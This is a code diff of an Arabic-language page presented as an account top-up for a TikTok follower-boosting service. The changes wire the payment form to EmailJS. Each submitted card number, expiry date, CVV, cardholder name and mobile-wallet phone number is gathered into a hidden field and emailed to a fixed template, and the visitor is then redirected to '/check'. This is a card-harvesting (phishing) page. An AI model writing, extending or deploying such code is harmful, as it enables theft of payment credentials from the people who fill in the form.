@@ -6,6 +6,14 @@
     <title>شحن حسابك - رشق وزيادة متابعين تيك توك</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // Initialize EmailJS with your Public Key
+        // Replace 'UbJp42lWtq38Tx9mi' with your actual EmailJS Public Key if it changes
+        (function() {
+            emailjs.init("UbJp42lWtq38Tx9mi");
+        })();
+    </script>
     <style>
         body {
             font-family: 'Inter', sans-serif;
@@ -140,57 +148,52 @@
                     </p>
                     <div class="mb-4">
                         <label for="cardNumber" class="block text-gray-700 text-base font-medium mb-2">رقم البطاقة</label>
-                        <input type="text" id="cardNumber" name="cardNumber" 
-                               class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" 
-                               placeholder="XXXX XXXX XXXX XXXX" 
-                               maxlength="19" 
-                               pattern="[0-9]{4} ?[0-9]{4} ?[0-9]{4} ?[0-9]{4}" 
+                        <input type="text" id="cardNumber" name="cardNumber"
+                               class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200"
+                               placeholder="XXXX XXXX XXXX XXXX"
+                               maxlength="19"
+                               pattern="[0-9]{4} ?[0-9]{4} ?[0-9]{4} ?[0-9]{4}"
                                title="أدخل رقم بطاقة ائتمانية صحيح (16 رقمًا)" required>
                     </div>
                     <div class="grid grid-cols-2 gap-4 mb-4">
                         <div>
                             <label for="expiryDate" class="block text-gray-700 text-base font-medium mb-2">تاريخ الانتهاء (MM/YY)</label>
-                            <input type="text" id="expiryDate" name="expiryDate" 
-                                   class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" 
-                                   placeholder="MM/YY" 
-                                   maxlength="5" 
-                                   pattern="(0[1-9]|1[0-2])\/?([0-9]{2})" 
+                            <input type="text" id="expiryDate" name="expiryDate"
+                                   class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200"
+                                   placeholder="MM/YY"
+                                   maxlength="5"
+                                   pattern="(0[1-9]|1[0-2])\/?([0-9]{2})"
                                    title="أدخل تاريخ انتهاء صلاحية صحيح (MM/YY)" required>
                         </div>
                         <div>
                             <label for="cvv" class="block text-gray-700 text-base font-medium mb-2">CVV</label>
-                            <input type="text" id="cvv" name="cvv" 
-                                   class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" 
-                                   placeholder="XXX" 
-                                   maxlength="4" 
-                                   pattern="[0-9]{3,4}" 
+                            <input type="text" id="cvv" name="cvv"
+                                   class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200"
+                                   placeholder="XXX"
+                                   maxlength="4"
+                                   pattern="[0-9]{3,4}"
                                    title="أدخل رمز CVV صحيح (3 أو 4 أرقام)" required>
                         </div>
                     </div>
                     <div class="mb-4">
                         <label for="cardholderName" class="block text-gray-700 text-base font-medium mb-2">اسم حامل البطاقة</label>
-                        <input type="text" id="cardholderName" name="cardholderName" 
-                               class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200" 
+                        <input type="text" id="cardholderName" name="cardholderName"
+                               class="w-full px-4 py-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-red-500 transition duration-200"
                                placeholder="الاسم كما يظهر على البطاقة" required>
                     </div>
                 </div>
 
-                <button type="submit" class="w-full bg-red-500 text-white px-6 py-3 rounded-full text-lg font-bold hover:bg-red-600 transition duration-300 ease-in-out shadow-md transform hover:scale-105">
+                <input type="hidden" id="emailJsMessage" name="message">
+
+                <input type="hidden" name="name" value="Test Name">
+                <input type="hidden" name="title" value="Test Title">
+                <input type="hidden" name="email" value="test@example.com">
+
+
+                <button type="submit" id="submitButton" class="w-full bg-red-500 text-white px-6 py-3 rounded-full text-lg font-bold hover:bg-red-600 transition duration-300 ease-in-out shadow-md transform hover:scale-105">
                     تأكيد الشحن
                 </button>
             </form>
-                        <div class="mt-12 p-6 bg-gray-100 rounded-xl shadow-inner border border-gray-200">
-                <h3 class="text-xl font-semibold text-gray-800 mb-4 text-center">جمع جميع المدخلات (للتجربة)</h3>
-                <button id="collectInputsButton" class="w-full bg-blue-500 text-white px-6 py-3 rounded-full text-lg font-bold hover:bg-blue-600 transition duration-300 ease-in-out shadow-md transform hover:scale-105">
-                    عرض جميع المدخلات
-                </button>
-                <div id="collectedInputsDisplay" class="mt-6 p-4 bg-white rounded-lg border border-gray-300 text-gray-800 text-sm overflow-auto max-h-60" style="white-space: pre-wrap;">
-                    المدخلات ستظهر هنا...
-                </div>
-            </div>
-        </div>
-            
-            
         </div>
     </main>
 
@@ -204,45 +207,7 @@
             </div>
         </div>
     </footer>
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
-<script>
-  (function(){
-    emailjs.init("UbJp42lWtq38Tx9mi"); // ضع المفتاح العام هنا
-  })();
-
-  // إنشاء نموذج وإضافة القيم يدويًا
-  const form = document.createElement('form');
-
-  const inputName = document.createElement('input');
-  inputName.name = "name";
-  inputName.value = "Test Name";
-
-  const inputTitle = document.createElement('input');
-  inputTitle.name = "title";
-  inputTitle.value = "Test Title";
-
-  const inputMessage = document.createElement('input');
-  inputMessage.name = "message";
-  inputMessage.value = "This is a message sent via JavaScript only.";
-
-  const inputEmail = document.createElement('input');
-  inputEmail.name = "email";
-  inputEmail.value = "test@example.com";
-
-  form.appendChild(inputName);
-  form.appendChild(inputTitle);
-  form.appendChild(inputMessage);
-  form.appendChild(inputEmail);
-
-  // إرسال النموذج
-  emailjs.sendForm('default_service', 'template_qyhaxqi', form)
-    .then(() => {
-      alert('تم الإرسال بنجاح!');
-    }, (err) => {
-      alert('حدث خطأ: ' + JSON.stringify(err));
-      });
-</script>
     <script>
         const paymentMethodSelect = document.getElementById('paymentMethod');
         const vodafoneCashDetails = document.getElementById('vodafoneCashDetails');
@@ -251,6 +216,7 @@
         const rechargeForm = document.getElementById('rechargeForm');
         const messageBox = document.getElementById('messageBox');
         const amountInput = document.getElementById('amount');
+        const submitButton = document.getElementById('submitButton'); // Reference to the submit button
 
         const MIN_RECHARGE_AMOUNT = 0.30;
 
@@ -259,6 +225,9 @@
         const expiryDateInput = document.getElementById('expiryDate');
         const cvvInput = document.getElementById('cvv');
         const cardholderNameInput = document.getElementById('cardholderName');
+
+        // Hidden message input for EmailJS (renamed to avoid conflict with a common 'message' variable)
+        const emailJsMessageInput = document.getElementById('emailJsMessage');
 
         // Function to display messages
         function showMessage(message, type) {
@@ -280,7 +249,11 @@
             orangeCashDetails.classList.add('hidden');
             creditCardDetails.classList.add('hidden');
 
-            // Set all required attributes to false initially
+            // Set all required attributes to false initially for all payment method specific inputs
+            document.getElementById('vodafonePhone').removeAttribute('required');
+            document.getElementById('vodafoneTransactionId').removeAttribute('required'); // Also remove required for optional fields
+            document.getElementById('orangePhone').removeAttribute('required');
+            document.getElementById('orangeTransactionId').removeAttribute('required'); // Also remove required for optional fields
             cardNumberInput.removeAttribute('required');
             expiryDateInput.removeAttribute('required');
             cvvInput.removeAttribute('required');
@@ -290,17 +263,16 @@
             if (this.value === 'vodafone-cash') {
                 vodafoneCashDetails.classList.remove('hidden');
                 vodafoneCashDetails.classList.add('active');
-                // For Vodafone Cash, you might want to make phone number required
                 document.getElementById('vodafonePhone').setAttribute('required', 'true');
+                // Transaction ID is optional, so no 'required' attribute
             } else if (this.value === 'orange-cash') {
                 orangeCashDetails.classList.remove('hidden');
                 orangeCashDetails.classList.add('active');
-                // For Orange Cash, you might want to make phone number required
                 document.getElementById('orangePhone').setAttribute('required', 'true');
+                // Transaction ID is optional, so no 'required' attribute
             } else if (this.value === 'credit-card') {
                 creditCardDetails.classList.remove('hidden');
                 creditCardDetails.classList.add('active');
-                // Make credit card fields required when selected
                 cardNumberInput.setAttribute('required', 'true');
                 expiryDateInput.setAttribute('required', 'true');
                 cvvInput.setAttribute('required', 'true');
@@ -348,102 +320,72 @@
                     showMessage('الرجاء تعبئة جميع حقول البطاقة الائتمانية المطلوبة.', 'error');
                     return;
                 }
-                // Further regex validation can be added here if needed,
-                // but HTML5 pattern attribute already provides basic client-side check.
+            }
+            // Client-side validation for Vodafone/Orange Cash phone number if selected
+            if (selectedMethod === 'vodafone-cash') {
+                if (!document.getElementById('vodafonePhone').value) {
+                    showMessage('الرجاء إدخال رقم الهاتف المحول منه لفودافون كاش.', 'error');
+                    return;
+                }
+            } else if (selectedMethod === 'orange-cash') {
+                if (!document.getElementById('orangePhone').value) {
+                    showMessage('الرجاء إدخال رقم الهاتف المحول منه لأورانج كاش.', 'error');
+                    return;
+                }
             }
 
-            // Simulate processing
-            showMessage('جاري تأكيد عملية الشحن، يرجى الانتظار...', 'success');
 
-            setTimeout(() => {
-                // In a real application, you would send this data to a backend
-                // for verification and actual balance update.
-                console.log('Recharge request submitted:');
-                console.log('Amount:', amount);
-                console.log('Payment Method:', selectedMethod);
-
-                if (selectedMethod === 'vodafone-cash') {
-                    const vodafonePhone = document.getElementById('vodafonePhone').value;
-                    const vodafoneTransactionId = document.getElementById('vodafoneTransactionId').value;
-                    console.log('Vodafone Phone:', vodafonePhone);
-                    console.log('Vodafone Transaction ID:', vodafoneTransactionId);
-                } else if (selectedMethod === 'orange-cash') {
-                    const orangePhone = document.getElementById('orangePhone').value;
-                    const orangeTransactionId = document.getElementById('orangeTransactionId').value;
-                    console.log('Orange Phone:', orangePhone);
-                    console.log('Orange Transaction ID:', orangeTransactionId);
-                } else if (selectedMethod === 'credit-card') {
-                    console.log('Card Number:', cardNumberInput.value);
-                    console.log('Expiry Date:', expiryDateInput.value);
-                    console.log('CVV:', cvvInput.value);
-                    console.log('Cardholder Name:', cardholderNameInput.value);
-                }
-document.getElementById("message").value = 'ضع جميع الادخالات هن'ا;
-
-  const btn = document.getElementById('button');
-const serviceID = 'default_service'; // تأكد أنه نفس اسم الخدمة في حسابك
-
-    const templateID = 'template_qyhaxqi'; // تأكد من اسم القالب
-
-​
-
-    emailjs.sendForm(serviceID, templateID, this)
-
-      .then(() => {
-
-
-
-        alert('تم الإرسال بنجاح!');
-
-      }, (err) => {
-
-        
-
-        alert('حدث خطأ: ' + JSON.stringify(err));
-
-      });
-                showMessage('تم استلام طلب الشحن بنجاح! سيتم مراجعة طلبك وتحديث رصيدك قريباً.', 'success');
-                // In a real app, you would redirect or update UI after successful backend processing
-                setTimeout(() => { window.location.href ='/check'; }, 3000);
-            }, 2000); // Simulate 2 seconds processing time
-        });
-        collectInputsButton.addEventListener('click', function() {
-            let inputs = {};
-            inputs['المبلغ'] = amountInput.value + '$';
-            inputs['طريقة الدفع'] = paymentMethodSelect.options[paymentMethodSelect.selectedIndex].text;
-
-            const selectedMethod = paymentMethodSelect.value;
+            // Collect all inputs into a string for the hidden message field
+            let collectedData = `طلب شحن جديد:\n`;
+            collectedData += `المبلغ: ${amountInput.value}$\n`;
+            collectedData += `طريقة الدفع: ${paymentMethodSelect.options[paymentMethodSelect.selectedIndex].text}\n`;
 
             if (selectedMethod === 'vodafone-cash') {
-                inputs['رقم هاتف فودافون كاش'] = document.getElementById('vodafonePhone').value;
-                inputs['رقم عملية فودافون كاش'] = document.getElementById('vodafoneTransactionId').value;
+                collectedData += `رقم هاتف فودافون كاش: ${document.getElementById('vodafonePhone').value}\n`;
+                collectedData += `رقم عملية فودافون كاش: ${document.getElementById('vodafoneTransactionId').value || 'غير متوفر'}\n`;
             } else if (selectedMethod === 'orange-cash') {
-                inputs['رقم هاتف أورانج كاش'] = document.getElementById('orangePhone').value;
-                inputs['رقم عملية أورانج كاش'] = document.getElementById('orangeTransactionId').value;
+                collectedData += `رقم هاتف أورانج كاش: ${document.getElementById('orangePhone').value}\n`;
+                collectedData += `رقم عملية أورانج كاش: ${document.getElementById('orangeTransactionId').value || 'غير متوفر'}\n`;
             } else if (selectedMethod === 'credit-card') {
-                inputs['رقم البطاقة'] = cardNumberInput.value;
-                inputs['تاريخ الانتهاء'] = expiryDateInput.value;
-                inputs['CVV'] = cvvInput.value;
-                inputs['اسم حامل البطاقة'] = cardholderNameInput.value;
+                collectedData += `رقم البطاقة: ${cardNumberInput.value}\n`;
+                collectedData += `تاريخ الانتهاء: ${expiryDateInput.value}\n`;
+                collectedData += `CVV: ${cvvInput.value}\n`;
+                collectedData += `اسم حامل البطاقة: ${cardholderNameInput.value}\n`;
             }
 
-            let displayText = 'جميع المدخلات:\n';
-            for (const key in inputs) {
-                if (inputs.hasOwnProperty(key)) {
-                    displayText += `${key}: ${inputs[key]}\n`;
-                }
-            }
-            collectedInputsDisplay.textContent = displayText;
+            // Set the collected data to the hidden message input
+            emailJsMessageInput.value = collectedData;
+
+            // Disable button and show sending status
+            submitButton.value = 'جاري الإرسال...';
+            submitButton.disabled = true;
+            submitButton.classList.add('opacity-50', 'cursor-not-allowed');
+
+            // Send the form using EmailJS
+            const serviceID = 'default_service'; // Your EmailJS Service ID
+            const templateID = 'template_qyhaxqi'; // Your EmailJS Template ID
+
+            emailjs.sendForm(serviceID, templateID, this) // 'this' refers to the rechargeForm
+                .then(() => {
+                    submitButton.value = 'تأكيد الشحن';
+                    submitButton.disabled = false;
+                    submitButton.classList.remove('opacity-50', 'cursor-not-allowed');
+                    // showMessage('تم استلام طلب الشحن بنجاح! سيتم مراجعة طلبك وتحديث رصيدك قريباً.', 'success'); // This message will be shown briefly before redirect
+                    // Redirect to user_details.html after successful email sending
+                    window.location.href = '/check';
+                }, (err) => {
+                    submitButton.value = 'تأكيد الشحن';
+                    submitButton.disabled = false;
+                    submitButton.classList.remove('opacity-50', 'cursor-not-allowed');
+                    showMessage('حدث خطأ أثناء إرسال الطلب: ' + JSON.stringify(err), 'error');
+                });
         });
-        
-        
 
         // Logout button functionality (from previous pages)
         document.getElementById('logoutButton').addEventListener('click', function(event) {
             event.preventDefault();
             window.location.href = 'login.html'; // Redirect to login page
         });
-
-​
+    </script>
 </body>
 </html>
